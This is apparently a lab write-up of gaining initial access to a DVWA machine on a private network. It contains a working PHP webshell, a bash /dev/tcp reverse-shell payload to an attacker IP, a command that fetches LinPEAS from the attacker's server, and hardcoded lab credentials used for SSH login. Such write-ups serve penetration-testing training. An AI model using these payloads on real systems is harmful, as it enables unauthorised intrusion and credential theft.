# Initial Access — LNX Exploitation

**ATT&CK Techniques:** T1190 · T1552.001 · T1078 · T1083

---

## Objective

Gain an initial foothold on the LNX machine by exploiting a vulnerable web application, discovering hardcoded credentials, and establishing an SSH session as a low-privilege user.

---

## Environment

| Property | Value |
|---|---|
| Target | LNX — 192.168.60.10 |
| Attacker | Kali Linux — 10.8.0.2 (VPN tunnel IP) |
| Access method | OpenVPN tunnel into DMZ segment |

---

## Tools Used

- Nmap
- Firefox / curl
- Netcat (nc)
- LinPEAS
- PHP webshell

---

## Steps

### 1. Reconnaissance — Port Scan (T1595, T1046)

```bash
nmap -sC -sV -p- 192.168.60.10 -T4 -oN lnx-nmap.txt
```

**Output:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-title: Login :: Damn Vulnerable Web Application (DVWA) v1.10
```

Two services exposed: SSH on port 22 and DVWA on port 80.

---

### 2. Web Application Exploit — File Upload (T1190)

Browsed to `http://192.168.60.10`, logged into DVWA with default credentials (`admin:password`), set security level to **Low**, and navigated to the **File Upload** module.

Created a PHP webshell on Kali:
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

Uploaded `shell.php` via the DVWA File Upload page. DVWA confirmed the upload path:
```
../../hackable/uploads/shell.php
```

Verified RCE:
```bash
curl "http://192.168.60.10/hackable/uploads/shell.php?cmd=id"
```

**Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Remote code execution confirmed as `www-data`.

---

### 3. Reverse Shell

Started a Netcat listener on Kali:
```bash
nc -lvnp 4444
```

Sent reverse shell payload via webshell:
```bash
curl "http://192.168.60.10/hackable/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.8.0.2/4444+0>%261'"
```

Reverse shell landed as `www-data` inside the DVWA Docker container (`e21888d5f585`).

---

### 4. Credential Discovery via LinPEAS (T1083, T1552.001)

Transferred LinPEAS to the container via PHP file_get_contents (no curl/wget available in container):

```bash
# From Kali — serve LinPEAS
python3 -m http.server 8000

# Via webshell — download to container
curl "http://192.168.60.10/hackable/uploads/shell.php?cmd=php+-r+'file_put_contents(\"/tmp/linpeas.sh\",file_get_contents(\"http://10.8.0.2:8000/linpeas.sh\"));'"
```

Executed LinPEAS from the reverse shell:
```bash
sh /tmp/linpeas.sh
```

LinPEAS flagged `/opt/scripts/backup.sh` under "Backup files":
```
-rw-r--r-- 1 root root 115 Jul 27 08:08 /opt/scripts/backup.sh
```

Read the file:
```bash
cat /opt/scripts/backup.sh
```

**Output:**
```bash
#!/bin/bash
# backup script - runs as starboy
sshpass -p 'momomo' rsync -avz /var/www/ starboy@localhost:/backups/
```

Credentials discovered: `starboy:momomo`

---

### 5. SSH Login as starboy (T1078)

```bash
ssh starboy@192.168.60.10
```

Password: `momomo`

**Output:**
```
Linux LNX 6.12.94+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.94-1
Last login: Mon Jul 27 04:49:21 2026 from 10.8.0.2
starboy@LNX:~$
```

User flag captured:
```bash
cat ~/user.txt
```
```
user{ssh_footh0ld_pe_chain_complete}
```

---

## ATT&CK Mapping

| Technique ID | Name | Description |
|---|---|---|
| T1595 / T1046 | Active Scanning / Network Service Discovery | Nmap scan revealed SSH and DVWA on port 22/80 |
| T1190 | Exploit Public-Facing Application | PHP webshell uploaded via DVWA File Upload (security level: Low) |
| T1083 | File and Directory Discovery | LinPEAS enumerated filesystem, flagged /opt/scripts/backup.sh |
| T1552.001 | Credentials In Files | backup.sh contained hardcoded SSH credentials for starboy |
| T1078 | Valid Accounts | Used discovered credentials to SSH in as starboy |

---

## Key Takeaways

- DVWA's File Upload module at Low security applies zero validation — any file type is accepted including PHP
- Hardcoded credentials in backup/automation scripts are a extremely common real-world finding
- LinPEAS reliably surfaces world-readable credential files under the "Backup files" section
- The attack chain from unauthenticated web access to a valid SSH session required zero exploitation of memory corruption or CVEs — purely logic/misconfiguration abuse
